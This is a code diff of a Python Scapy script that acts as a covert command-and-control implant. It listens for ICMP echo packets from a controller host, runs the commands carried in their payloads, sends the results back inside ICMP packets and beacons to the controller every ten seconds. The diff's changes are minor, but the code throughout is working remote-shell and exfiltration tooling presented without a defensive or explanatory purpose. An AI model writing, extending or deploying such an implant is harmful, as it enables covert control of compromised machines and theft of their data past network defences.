@@ -1,4 +1,4 @@
-from scapy.all import IP, ICMP, send, Raw, AsyncSniffer
+from scapy.all import *
 import time
 import socket
 
@@ -23,6 +23,7 @@ def handle_incoming(pkt):
     if IP in pkt and ICMP in pkt:
         if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
             if Raw in pkt:
+                # need to handle CMD vs regular
                 task = pkt[Raw].load.decode(errors="ignore")
                 print(f"[+] Received task: {task}")
                 run_task(task)
@@ -36,14 +37,14 @@ def run_task(cmd):
     except Exception as e:
         result = str(e)
 
-    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/result.encode()
+    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/f"RESULT|{result}".encode()
     send(pkt, verbose=0)
     print(f"[+] Sent results")
 
 if __name__ == "__main__":
     sniffer = AsyncSniffer(filter=f"icmp and src {SERVER_IP}", prn=handle_incoming, store=False)
     sniffer.start()
-    
+
     while True:
         send_beacon()
         time.sleep(10)
